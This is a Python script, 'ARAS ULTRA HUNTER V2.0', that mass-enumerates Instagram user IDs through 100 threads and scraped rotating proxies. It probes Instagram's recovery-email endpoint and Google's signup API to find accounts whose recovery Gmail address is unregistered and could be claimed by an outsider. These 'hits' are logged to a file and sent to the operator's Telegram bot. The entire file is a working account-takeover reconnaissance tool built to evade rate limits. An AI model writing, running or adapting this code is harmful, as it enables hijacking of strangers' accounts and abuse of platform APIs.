import os
import requests
import sys
import time
import datetime
import random
import json
import string
import hashlib
import uuid
import re
from threading import Thread, Lock
from queue import Queue
from user_agent import generate_user_agent
from colorama import Fore, Style, init
from rich.console import Console
from rich.table import Table
from rich.live import Live

# Initialize Colorama and Rich
init(autoreset=True)
console = Console()

# --- Configuration & Constants ---
INSTA_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
GOOGLE_SIGNUP_URL = 'https://accounts.google.com/_/signup/validatepersonaldetails'
INSTA_GRAPHQL_URL = 'https://www.instagram.com/api/graphql'

# Global Stats
stats = {
    "total": 0,
    "hits": 0,
    "bad_insta": 0,
    "bad_email": 0,
    "good_ig": 0,
    "errors": 0,
    "proxies": 0
}
stats_lock = Lock()
proxies_list = []
proxy_queue = Queue()

# --- Proxy Scraper ---
def scrape_proxies():
    global proxies_list
    console.print("[bold yellow][*] Scrapping fresh proxies... Please wait.[/bold yellow]")
    urls = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://www.proxy-list.download/api/v1/get?type=http",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
    ]
    
    unique_proxies = set()
    for url in urls:
        try:
            res = requests.get(url, timeout=10)
            if res.status_code == 200:
                found = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', res.text)
                unique_proxies.update(found)
        except:
            continue
            
    proxies_list = list(unique_proxies)
    for p in proxies_list:
        proxy_queue.put(p)
        
    with stats_lock:
        stats["proxies"] = len(proxies_list)
    console.print(f"[bold green][+] Found {len(proxies_list)} unique proxies![/bold green]")

def get_proxy():
    if proxy_queue.empty():
        # Re-fill if empty
        for p in proxies_list:
            proxy_queue.put(p)
    
    if proxy_queue.empty():
        return None
        
    p = proxy_queue.get()
    return {"http": f"http://{p}", "https": f"http://{p}"}

# --- Core Logic ---

class Hunter:
    def __init__(self, telegram_id, bot_token, bbk, end_id):
        self.telegram_id = telegram_id
        self.bot_token = bot_token
        self.bbk = bbk
        self.end_id = end_id
        self.session = requests.Session()
        self.google_token = None
        self.google_host = None
        self.token_expiry = 0

    def refresh_google_token(self):
        try:
            ua = generate_user_agent()
            headers = {'accept': '*/*', 'user-agent': ua}
            proxy = get_proxy()
            res = self.session.get('https://accounts.google.com/signin/v2/usernamerecovery', headers=headers, proxies=proxy, timeout=5)
            match = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res.text)
            if match:
                tok = match.group(2)
                n1, n2 = "aras", "hunt"
                v_headers = {'authority': 'accounts.google.com', 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8', 'user-agent': ua}
                v_data = {'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]'}
                v_res = self.session.post(GOOGLE_SIGNUP_URL, headers=v_headers, data=v_data, proxies=proxy, timeout=5)
                if '",null,"' in v_res.text:
                    self.google_token = v_res.text.split('",null,"')[1].split('"')[0]
                    self.google_host = v_res.cookies.get_dict().get('__Host-GAPS', "dummy")
                    self.token_expiry = time.time() + 300
                    return True
        except: pass
        return False

    def check_gmail(self, username):
        if not self.google_token or time.time() > self.token_expiry:
            if not self.refresh_google_token(): return False
        try:
            headers = {'user-agent': generate_user_agent(), 'referer': f'https://accounts.google.com/signup/v2/createusername?TL={self.google_token}'}
            data = f"continue=https%3A%2F%2Fmail.google.com&f.req=%5B%22TL%3A{self.google_token}%22%2C%22{username}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&flowName=GlifWebSignIn"
            proxy = get_proxy()
            res = self.session.post('https://accounts.google.com/_/signup/usernameavailability', headers=headers, data=data, params={'TL': self.google_token}, proxies=proxy, timeout=5)
            return '"gf.uar",1' in res.text
        except: return False

    def send_telegram(self, msg):
        try: requests.post(f"https://api.telegram.org/bot{self.bot_token}/sendMessage", data={"chat_id": self.telegram_id, "text": msg}, timeout=5)
        except: pass

    def worker(self):
        while True:
            try:
                target_id = random.randint(self.bbk, self.end_id)
                proxy = get_proxy()
                lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                headers = {'X-FB-LSD': lsd, 'User-Agent': generate_user_agent()}
                data = {'lsd': lsd, 'variables': json.dumps({'id': target_id, 'render_surface': 'PROFILE'}), 'doc_id': '25618261841150840'}
                
                response = self.session.post(INSTA_GRAPHQL_URL, headers=headers, data=data, proxies=proxy, timeout=5)
                user_data = response.json().get('data', {}).get('user')
                
                if not user_data:
                    with stats_lock: stats["bad_insta"] += 1
                    continue
                
                username = user_data.get('username')
                with stats_lock: stats["good_ig"] += 1
                
                check_data = {'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({'_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','adid': str(uuid.uuid4()),'guid': str(uuid.uuid4()),'device_id': 'android-123','query': f"{username}@gmail.com"}),'ig_sig_key_version': '4'}
                check_res = self.session.post(INSTA_RECOVERY_URL, headers={'User-Agent': generate_user_agent()}, data=check_data, proxies=proxy, timeout=5)
                
                if f"{username}@gmail.com" in check_res.text:
                    if self.check_gmail(username):
                        with stats_lock: stats["hits"] += 1
                        msg = f"🔥 HIT! @{username} | ID: {user_data.get('pk')} | Followers: {user_data.get('follower_count')}"
                        self.send_telegram(msg)
                        with open('hits.txt', 'a') as f: f.write(msg + "\n")
                    else:
                        with stats_lock: stats["bad_email"] += 1
                else:
                    with stats_lock: stats["bad_email"] += 1
                
                with stats_lock: stats["total"] += 1
            except:
                with stats_lock: stats["errors"] += 1

# --- UI ---
def update_table():
    table = Table(title="ARAS ULTRA HUNTER - AUTO PROXY MODE", header_style="bold cyan")
    table.add_column("Stat", style="yellow")
    table.add_column("Value", style="bold green")
    with stats_lock:
        table.add_row("Total Scanned", str(stats["total"]))
        table.add_row("Active Proxies", str(stats["proxies"]))
        table.add_row("Valid IG", str(stats["good_ig"]))
        table.add_row("HITS 🔥", str(stats["hits"]))
        table.add_row("Errors/Bans", str(stats["errors"]))
    return table

def main():
    os.system('clear')
    console.print("[bold blue]ARAS ULTRA HUNTER V2.0[/bold blue]", justify="center")
    scrape_proxies()
    tg_id = console.input("[green]Telegram ID: [/green]")
    tg_token = console.input("[green]Bot Token: [/green]")
    console.print("\n[yellow]Starting Ultra-Fast Threads (100 threads)...[/yellow]")
    
    hunter = Hunter(tg_id, tg_token, 10000, 21254029834)
    for _ in range(100): Thread(target=hunter.worker, daemon=True).start()
    
    with Live(update_table(), refresh_per_second=2) as live:
        while True:
            time.sleep(1)
            live.update(update_table())

if __name__ == "__main__":
    main()
